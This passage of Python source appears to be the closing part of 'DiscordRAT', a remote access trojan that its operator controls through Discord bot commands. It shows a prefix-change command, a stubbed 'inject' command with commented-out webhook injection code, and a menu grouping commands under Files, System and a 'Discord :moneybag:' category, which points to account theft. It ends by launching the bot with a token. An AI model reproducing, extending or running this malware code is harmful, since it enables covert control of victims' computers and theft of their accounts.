            await ctx.send(embed = rat.EmbMsg(f"`Bot Prefix`", f"```Bot Prefix Changed to '{prefix}'```"))

        @RAT.command()
        async def inject(ctx, *webhook):
            await ctx.send("[x] Not working yet!")
            #injection = rat.tools.Injector(webhook)
            #injection.inject()
            #await ctx.send(embed = rat.EmbMsg(f"`Injection`", f"```Injection successful!```"))

        @RAT.command(aliases=['help', 'options'])
        async def menu(ctx):
            for i in range(len(Commands.dict_list)):
                commandlist = Commands.dict_list[i]
                if i == 0: collection = "Misc :grey_question:"
                elif i==1: collection = "Files :open_file_folder:"
                elif i==2: collection = "System :computer:"
                elif i==3: collection = "Discord :moneybag:"
                elif i==4: collection = "Settings :gear:"

                embed = discord.Embed(title = f"{collection}", color=Colours.dict.get(Variables.embColour))
                for command, description in commandlist.items():
                    embed.add_field(
                        name=f"{Variables.botPrefix}{command}",
                        value=description, inline=False
                    )

                await ctx.send(embed = embed)

        RAT.run(rat.token)

DiscordRAT = Bot()
DiscordRAT.Main()
